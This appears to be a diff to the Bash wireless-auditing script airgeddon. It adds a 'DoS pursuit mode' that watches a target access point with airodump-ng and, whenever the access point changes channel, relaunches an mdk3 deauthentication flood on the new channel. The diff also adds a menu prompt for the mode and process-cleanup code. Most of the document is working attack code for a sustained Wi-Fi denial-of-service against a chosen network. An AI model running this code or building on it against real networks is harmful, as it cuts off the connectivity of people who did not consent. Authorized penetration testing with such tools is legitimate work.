@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20171022
+#Date.........: 20171029
 #Version......: 7.23
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -2730,6 +2730,68 @@ function exec_wps_pin_database_reaver_attack() {
 	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
+#Execute DoS pursuit mode attack
+function launch_dos_pursuit_mode_attack() {
+
+	debug_print
+
+	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
+	rm -rf "${tmpdir}clts"* > /dev/null 2>&1
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
+		echo
+		language_strings "${language}" 507 "yellow"
+	fi
+
+	recalculate_windows_sizes
+	case "${1}" in
+		"mdk3 amok attack")
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+		;;
+		#TODO implement case for other DoS attacks
+	esac
+
+	dos_pursuit_mode_attack_pid=$!
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
+
+	airodump-ng -w "${tmpdir}dos_pm" "${interface}" > /dev/null 2>&1 &
+	dos_pursuit_mode_scan_pid=$!
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
+}
+
+#Parse and control pids for DoS pursuit mode attack
+pid_control_pursuit_mode() {
+
+	debug_print
+
+	while true; do
+		sleep 5
+		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
+			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)
+
+			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
+				if [[ "${item}" =~ ${bssid} ]]; then
+					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')
+
+					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
+						channel="${dos_pm_current_channel}"
+						kill_dos_pursuit_mode_processes
+						dos_pursuit_mode_pids=()
+						launch_dos_pursuit_mode_attack "${1}" "relaunch"
+					fi
+				fi
+			done
+		fi
+
+		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
+		if [ -z "${dos_attack_alive}" ]; then
+			break
+		fi
+	done
+
+	kill_dos_pursuit_mode_processes
+}
+
 #Execute mdk3 deauth DoS attack
 function exec_mdk3deauth() {
 
@@ -2744,10 +2806,19 @@ function exec_mdk3deauth() {
 	echo "${bssid}" > "${tmpdir}bl.txt"
 
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "mdk3 amok attack" "first_time"
+		pid_control_pursuit_mode "mdk3 amok attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+	fi
 }
 
 #Execute aireplay DoS attack
@@ -2852,6 +2923,12 @@ function mdk3_deauth_option() {
 		return
 	fi
 	ask_channel
+
+	ask_yesno 505 "yes"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+	fi
+
 	exec_mdk3deauth
 }
 
@@ -3322,6 +3399,7 @@ function initialize_menu_and_print_selections() {
 			print_all_target_vars
 		;;
 		"dos_attacks_menu")
+			dos_pursuit_mode=0
 			print_iface_selected
 			print_all_target_vars
 		;;
@@ -3414,6 +3492,7 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
 }
 
 #Manage cleaning firewall rules and restore orginal routing state
@@ -6983,6 +7062,17 @@ function kill_et_windows() {
 		kill "${item}" &> /dev/null
 	done
 	kill ${et_process_control_window} &> /dev/null
+}
+
+#Kill DoS pursuit mode processes
+function kill_dos_pursuit_mode_processes() {
+
+	debug_print
+
+	for item in "${dos_pursuit_mode_pids[@]}"; do
+		kill "${item}" &> /dev/null
+		wait "${item}" 2>/dev/null
+	done
 }
 
 #Convert capture file to hashcat format
